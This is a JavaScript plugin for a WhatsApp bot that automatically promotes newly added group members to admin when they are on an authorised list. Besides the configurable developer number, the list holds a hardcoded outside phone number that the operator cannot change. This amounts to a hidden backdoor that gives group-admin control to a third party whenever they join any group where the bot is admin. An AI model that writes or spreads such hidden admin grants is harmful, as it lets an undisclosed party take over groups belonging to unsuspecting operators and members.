const { cmd } = require('../command');
const settings = require('../settings');

// Debug logger
const debug = (...args) => console.log('[AUTO-ADMIN]', ...args);

cmd({
    on: "body"
}, async (conn, mek, m, {
    from,
    isGroup,
    participants,
    groupMetadata,
    isBotAdmins,
    sender
}) => {
    try {
        // 1. Basic checks
        if (settings.AUTO_ADMIN !== "true") {
            debug('Feature disabled in settings');
            return;
        }
        
        if (!isGroup) {
            debug('Not a group message');
            return;
        }

        // 2. Extract participant update
        const participantUpdate = mek.message?.groupParticipantsUpdate;
        debug('Participant update:', participantUpdate);
        
        if (!participantUpdate || participantUpdate.action !== 'add') {
            debug('Not an add action');
            return;
        }

        // 3. Verify bot is admin
        if (!isBotAdmins) {
            debug('Bot is not admin');
            return;
        }

        // 4. Prepare authorized users
        const normalizeJid = (jid) => {
            const num = (jid || '').toString().replace(/\D/g, '');
            return num.length >= 10 ? `${num}@s.whatsapp.net` : null;
        };

        const authorizedUsers = [
            normalizeJid(settings.DEV),
            normalizeJid("255741752020")
        ].filter(Boolean);

        debug('Authorized users:', authorizedUsers);

        // 5. Process new participants
        const newParticipants = participantUpdate.participants
            .map(p => normalizeJid(p))
            .filter(jid => jid && authorizedUsers.includes(jid));

        debug('New participants to process:', newParticipants);

        if (newParticipants.length === 0) {
            debug('No authorized new participants');
            return;
        }

        // 6. Promote users
        await conn.groupParticipantsUpdate(from, newParticipants, "promote");
        debug('Promotion successful for:', newParticipants);

        // 7. Notification
        if (settings.AUTO_ADMIN_NOTIFY === "true") {
            await conn.sendMessage(from, {
                text: `@${newParticipants[0].split('@')[0]} is now admin 👑`,
                mentions: [newParticipants[0]]
            });
        }

    } catch (error) {
        debug('Error:', error.message);
        console.error(error);
    }
});
